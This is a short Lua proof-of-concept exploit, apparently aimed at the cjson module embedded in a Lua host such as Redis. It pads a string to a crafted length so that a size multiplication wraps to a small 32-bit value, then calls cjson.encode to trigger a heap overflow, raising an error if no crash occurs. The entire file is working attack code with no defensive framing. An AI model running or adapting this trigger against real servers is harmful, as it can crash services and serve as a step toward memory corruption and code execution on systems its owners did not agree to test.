
local function exploit()
   local t = {}
   local vuln = "pwndorei"
   local evil_size = 0x2AAAAAD8
   -- evil_size * 6 = 1`00000110 (cast into int) 0x110

   -- test
   local test = {}

   local test = test[0x100]

   for i=1, 0x40000 do
      t[i] = vuln
   end

   vuln = table.concat(t)

   for i=1, 2 do
      vuln = vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln .. vuln
      
   end

   vuln = vuln .. vuln

   vuln = string.sub(vuln, 1, evil_size)

   local vuln_ret = cjson.encode(vuln)

   -- If not Crash
   error("Exploitation failed")
end

exploit()


